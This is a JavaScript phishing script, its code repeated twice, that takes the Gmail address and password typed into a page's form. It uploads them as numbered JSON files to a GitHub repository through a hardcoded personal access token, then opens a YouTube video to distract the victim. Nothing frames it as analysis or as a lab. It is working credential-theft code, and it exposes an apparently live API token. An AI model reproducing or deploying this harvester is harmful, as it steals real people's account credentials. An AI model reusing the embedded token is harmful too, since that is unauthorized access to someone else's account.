const token = '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';
const repoOwner = 'j9133';
const repoName = 'Data';

const gmail = document.getElementById('gmail')
const password = document.getElementById('password')

function main() {
  if (gmail.value && password.value) {
    uploadFile()
    window.open('https://youtube.com/shorts/yDFfKLQyj_s?si=ZGr-geKRba0D4_Uo', '_blank');
  }
}

async function getExistingFiles() {
  const response = await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/`, {
    method: 'GET',
    headers: {
      'Authorization': `token ${token}`
    }
  });
  const data = await response.json();
  return data;
}

async function getNextFileNumber() {
  const files = await getExistingFiles();
  let maxNumber = 0;
  files.forEach(file => {
    const match = file.name.match(/^data(\d+)\.json$/);
    if (match) {
      const number = parseInt(match[1]);
      if (number > maxNumber) maxNumber = number;
    }
  });
  return maxNumber + 1;
}

async function uploadFile() {
  const nextFileNumber = await getNextFileNumber();
  const fileName = `data${nextFileNumber}.json`;
  const jsonData = { "gmail": gmail.value,
  "password": password.value };
  const encodedData = new TextEncoder().encode(JSON.stringify(jsonData));
  
  const response = await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${fileName}`, {
    method: 'PUT',
    headers: {
      'Authorization': `token ${token}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      message: `Add ${fileName}`,
      content: btoa(String.fromCharCode(...encodedData)),
      branch: 'main'
    })
  });
  
  const result = await response.json();
  console.log(result);
}
const token = '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';
const repoOwner = 'j9133';
const repoName = 'Data';

const gmail = document.getElementById('gmail')
const password = document.getElementById('password')

function main() {
  if (gmail.value && password.value) {
    uploadFile()
    window.open('https://youtube.com/shorts/yDFfKLQyj_s?si=ZGr-geKRba0D4_Uo', '_blank');
  }
}

async function getExistingFiles() {
  const response = await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/`, {
    method: 'GET',
    headers: {
      'Authorization': `token ${token}`
    }
  });
  const data = await response.json();
  return data;
}

async function getNextFileNumber() {
  const files = await getExistingFiles();
  let maxNumber = 0;
  files.forEach(file => {
    const match = file.name.match(/^data(\d+)\.json$/);
    if (match) {
      const number = parseInt(match[1]);
      if (number > maxNumber) maxNumber = number;
    }
  });
  return maxNumber + 1;
}

async function uploadFile() {
  const nextFileNumber = await getNextFileNumber();
  const fileName = `data${nextFileNumber}.json`;
  const jsonData = { "gmail": gmail.value,
  "password": password.value };
  const encodedData = new TextEncoder().encode(JSON.stringify(jsonData));
  
  const response = await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${fileName}`, {
    method: 'PUT',
    headers: {
      'Authorization': `token ${token}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      message: `Add ${fileName}`,
      content: btoa(String.fromCharCode(...encodedData)),
      branch: 'main'
    })
  });
  
  const result = await response.json();
  console.log(result);
}
